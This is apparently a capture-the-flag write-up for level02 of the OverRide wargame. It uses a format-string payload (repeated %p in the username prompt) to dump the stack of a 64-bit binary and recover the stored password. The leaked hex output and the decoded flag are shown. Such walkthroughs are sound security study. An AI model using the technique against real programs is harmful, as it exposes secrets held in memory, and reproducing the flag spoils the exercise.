By analyzing the decompilated code we can see some vulnerabilities, 
at first we think thath the point of the exercise was to call:
system("/bin/sh");

but we had to pass the strncmp and for us it was very complicated so
we decided to do a string attack:

First thing we've done, is to calculate the distances between s and ptr.
Beacause ptr is containing the password and if we find the distances between s and ptr we could print the memory and find what was inside the stack so the password.

we know by looking the decompilated code that s is rbp-70h and ptr  is rbp-A0h => a0 = 160 and 70 = 112 => we've tried with theses value
but we didnt find the reel start of s we didnt find were was ptr.

So we decided to do the same thing but with s2 rbp-110h:
110 => 272
a0  => 160

272 - 160 = 112 ==> divide by 8 to have block of memory in 64 bits
=> 112 / 8 = 14 => So the distance between s2 and ptr is 14 blocks

We also know that the password is 41 bytes long (29 in hex),
so 41 / 8 = 5 => so the password is 5 blocks of memory long.

https://nixhacker.com/case-of-format-string-in-64-bit-is-it-still-critical/
In 64 bits we've print the memory with %p.


level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: AAAA
*****************************************                                                   | HERE START OF S2
0x7fffffffe4d0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a  0x7fffffffe6c8 0x1f7ff9a08 0x41414141 (nil) (nil)  (nil) (nil) (nil) (nil) (nil)  (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
                              | Beginig of ptr                                                                               | end of ptr

0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d => this is ptr so the password

756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d

pass it through decrypt.cpp

Hexadecimal: 756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d
ASCII: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
